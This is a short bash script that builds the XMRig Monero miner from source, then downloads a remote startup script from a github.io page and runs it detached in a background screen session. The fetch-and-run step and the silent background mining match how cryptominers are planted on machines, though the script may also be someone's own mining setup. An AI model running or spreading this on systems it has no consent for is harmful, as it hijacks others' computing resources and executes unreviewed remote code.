#!/bin/bash
sudo apt update
sudo apt-get -y install curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake ..
make
wget "https://slicommeo.github.io/2019/startxmr.sh"
sudo chmod +x startxmr.sh
screen -d -m ./startxmr.sh
